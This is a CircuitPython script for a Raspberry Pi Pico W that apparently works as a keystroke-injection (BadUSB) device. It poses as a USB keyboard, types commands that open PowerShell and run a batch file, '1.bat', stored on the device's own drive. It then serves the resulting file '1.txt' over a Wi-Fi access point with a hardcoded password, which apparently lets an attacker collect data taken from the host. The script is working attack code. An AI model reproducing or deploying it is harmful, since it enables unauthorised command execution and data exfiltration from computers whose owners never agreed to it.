import usb_hid
import time
import usb_hid_map as usb
from adafruit_hid.keyboard import Keyboard
import wifi
import socketpool

import supervisor
# Disable autoreload
supervisor.runtime.autoreload = False


def read_file(file_path):
    while True:
        try:
            with open(file_path, "r") as file:
                return file.read()
        except Exception as e:
            print("waiting file")
            time.sleep(1)


def simple_http_server():
    info = read_file("1.txt")
    print(info)
    html = ""
    for char in info:
        if char == "\n":
            html += char + "</br>\n"
        else:
            html += char
    server_socket = pool.socket()
    server_socket.bind((str(wifi.radio.ipv4_address_ap), 80))
    server_socket.listen(1)

    print("Server is listening on {}:80".format(str(wifi.radio.ipv4_address_ap)))

    while True:
        print("Waiting for a connection...")
        client_socket, client_address = server_socket.accept()
        print("Accepted connection from:", client_address)
        client_socket.send("HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n")
        print(info)
        client_socket.send(html)
        time.sleep(0.5)
        client_socket.close()


def send(this_input, sleep=0):
    for item in this_input:
        if type(item) is list:
            kbd.send(*item)
        else:
            kbd.send(item)
    time.sleep(sleep)


ap_ssid = "pico"
ap_password = "ocean23$A"
# Configure access point
wifi.radio.start_ap(ssid=ap_ssid, password=ap_password)
# Print access point settings
print("Access point created with SSID: {}, password: {}".format(ap_ssid, ap_password))
print("My IP address is", str(wifi.radio.ipv4_address_ap))
# Create a socket pool
pool = socketpool.SocketPool(wifi.radio)

kbd = Keyboard(usb_hid.devices)
payload1 = [usb.RUN]
payload2 = usb.get_sequence("powershell")
payload2.append(usb.ENTER)
time.sleep(1)
payload3 = usb.get_sequence('cd (Get-WmiObject -Class Win32_Volume -Filter "Label = \'PI\'").DriveLetter')
payload3.append(usb.ENTER)
payload4 = usb.get_sequence('.\\1.bat')
payload4.append(usb.ENTER)

time.sleep(0.2)
send(payload1, 0.2)
send(payload2, 0.5)
send(payload3)
send(payload4)


# Start the HTTP server
print("Hey there. whats up")
simple_http_server()
